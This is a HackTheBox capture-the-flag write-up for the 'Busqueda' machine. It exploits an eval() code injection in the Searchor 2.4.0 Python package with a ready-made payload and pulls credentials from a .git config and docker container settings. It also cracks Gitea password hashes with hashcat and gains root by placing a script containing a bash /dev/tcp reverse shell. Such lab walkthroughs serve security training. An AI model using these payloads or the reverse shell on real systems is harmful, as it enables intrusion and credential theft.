# [Busqueda](https://app.hackthebox.com/machines/Busqueda) - 04/05/2023 - HackTheBox write-up


## User flag

### Discovery

With a quick `nmap` we can find only a SSH and a HTTP server, so it will be only Web vulnerability exploitation.

The home page of the site is a "search page", we can search anything on a lot of services (google, YouTube...). With a `whatweb` command we can find that it's a Flask server :
```bash
$ whatweb http://searcher.htb
http://searcher.htb [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
```

On the homepage we can see it use `Searchor` a python package that provide the same service as the site, it's just based on this tool.

### Searching for vulnerability

There isn't other pages on the web app, so the vulnerability might come from this tool. By a quick searching on the net, we can find that before version 2.4.0, it's vulnerable to a [code injection](https://github.com/ArjunSharda/Searchor/pull/130/commits/29d5b1f28d29d6a282a5e860d456fab2df24a16b#diff-40a1b591e95ee135f3f26e8ffa117a4816c202b6ce76852be85018fed09c4436), because of a bad `eval()` usage. The vulnerability is patched in the next version, but the application use precisely the version 2.4.0, so it's definitely this vulnerability to exploit.

### Exploitation

First, I try to exploit the vulnerability with the `engine` parameter with the following payload :
```
engine=__class__.__base__.__mro__[1].__subclasses__()[241]('ls /home/',shell=True,stdout=-1).communicate()[0].strip()"#&query=test
```

Because this parameter is concatenate to `Engine.` it will result in :
```
url = eval(f"Engine.__class__.__base__.__mro__[1].__subclasses__()[241]('ls /home/',shell=True,stdout=-1).communicate()[0].strip()"#.search('{query}')")
```

And with the `Intruder` I was searching for the correct index in the `__subclasses__` to obtain `<class 'subprocess.Popen'>` and execute commands.

But this is not working, so I try with the other parameter `query`. First, I noticed that if I insert a quote (`'`) in my entry the rest of the parameter is ignored. The `query` parameter isn't escape at all, it's just inserted as is in the URL, and so, in the `eval()`. So I can execute any command with this parameter and, moreover, I will have the result printed in the HTTP response !

The following payload can execute any command on the server :
```
engine=Google&query=' + __import__('os').popen('<cmd>').read() + '
```

With this a wrote a small Python script to automate this command injection and send command easily. With this, I find that the user who run the Flask app is `svc` :
```bash
$ python rce.py id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
```

And so, I can just run the following command to get the flag :
```bash
$ python rce.py "cat /home/svc/user.txt"
[...flag...]
```

## Root flag

With this RCE on the server we can explore the file system and quickly, we can find something interesting : a `.git/` in the web app directory.

This directory can contains interesting informations such as old codes or credentials, and indeed, we just find this in the `.git/config` :
```bash
$ python rce.py "cat .git/config"
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

In this file we obtain two informations :
    - First we obtain some credentials : `cody:jh1usoih2bkjaspwe92`,
    - And, we find a subdomain : `gitea.searcher.htb`.

This subdomain, might be interesting for the continuation of the machine, and we can try this creds to connect to the SSH server.

With `cody:jh1usoih2bkjaspwe92` it doesn't work, but it works with `svc:jh1usoih2bkjaspwe92`.

### Searching for elevating privileges

So, we now have access to the server through SSH so we need to find a way to became `root`.

First, we can find the following with a `sudo -l`:
```bash
$ sudo -l
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

We can execute a python script with the `root` privileges. This script allow us to list and inspect running docker containers with the following arguments :
```bash
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py a
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

With `docker-ps` we can see there is currently two containers running, `gitea` for the web app under `gitea.searcher.htb` and `mysql_db` for the MySQL database.

The interesting command is the second, by searching on the web we can use `Go templates` to read informations about the containers. We can find that we can read all the informations in JSON format with the template `'{{json .}}'`. So we can run the following command :
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql_db | json_pp
```

We can see a lot of informations with this, and especially the following :
```json
"Env" : [
	"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
	"MYSQL_USER=gitea",
	"MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
	"MYSQL_DATABASE=gitea",
	"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
	"GOSU_VERSION=1.14",
	"MYSQL_MAJOR=8.0",
	"MYSQL_VERSION=8.0.31-1.el8",
	"MYSQL_SHELL_VERSION=8.0.31-1.el8"
]
```

And now, we can connect to the database as `root` user :
```bash
mysql -u root -p -h 172.19.0.2	# then write password
```

With this we can try to get the `administrator` password for the `Gitea` platform by trying to crack his hashed password. By searching in the GitHub repo of `Gitea` we can find the algorithm corresponding to the `password_hash_algo`: `pbkdf2`, is PBKDF2-HMAC-SHA256 with 10.000 iterations and a length of 50 bytes (400 bits or 100 hex. chars).
```mysql
mysql> select name,email,passwd,salt from user;
+---------------+----------------------------------+-----------------------------------------------------------------------------------------------------+-----------------------------------+
| name          | email                            | passwd                                                                                               | salt                             |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+----------------------------------+
| administrator | administrator@gitea.searcher.htb | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 | a378d3f64143b284f104c926b8b49dfb |
| cody          | cody@gitea.searcher.htb          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e | d1db0a75a18e50de754be2aafcad5533 |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+----------------------------------+
2 rows in set (0.00 sec)
```

We can convert this password hashes to a comprehensible format for `hashcat` and try to crack it with `rockyou.txt` :
```bash
$ cat hash.txt
sha256:10000:0dsKdaGOUN51S+Kq/K1VMw:sfiV6O/gcOGE5VObxdk7NiskbbZ/OitpkvN4iMt3joRMABfaj+id14S+NdqaM3YJ6C4
sha256:10000:o3jT9kFDsoTxBMkmuLSd+w:ulmNmcIgJJHTbs8T1cKLdOJziwcobtxziKL8hwGW9sTaZWWtn/aLHSijHu7bFVS13MI
$ hashcat -m 10900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

It takes some times because PBKDF2-HMAC-SHA256 is a pretty strong hash format, but in 30 mins we can achieve the wordlist `rockyou.txt`, but it doesn't find a password, so we need to find something else.

Finally, I notice that I didn't try to log in on the `Gitea` instance with all the combinations of usernames and passwords, and indeed we can log in as an `administrator` with the password `yuiu1hoiu4i5ho1uh (MYSQL_PASSWORD)`. With this account we can now read the scripts in `/opt/scripts` that we see before without the possibility of read them. There is a script `full-checkup.sh` in the same directory which is called if we provide `full-checkup` as an argument to the `system-checkup.py` script. It's called with `subprocess.run()` so we cannot inject command but the path is `./full-checkup.sh` in the script so we can maybe modify the PATH or PWD environnement variable to make the script call our own `full-checkup.sh` and obtain a shell as `root`.

### Exploitation

We don't even need to modify environnement variables to call our own `full-checkup.sh`. We just need to go to a writeable directory and create a reverse shell script, for example :
```bash
$ cat /home/svc/tmp/full-checkup.sh
#!/usr/bin/bash
bash -i >& /dev/tcp/10.10.14.65/1234 0>&1
```

The script is called with `./full-checkup.sh` so we need to precise the interpreter with "`#!/usr/bin/bash`" or it will not works.

Now we can start a `nc` on our machine and run the command `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`, and we will get a reverse shell as root on the server !
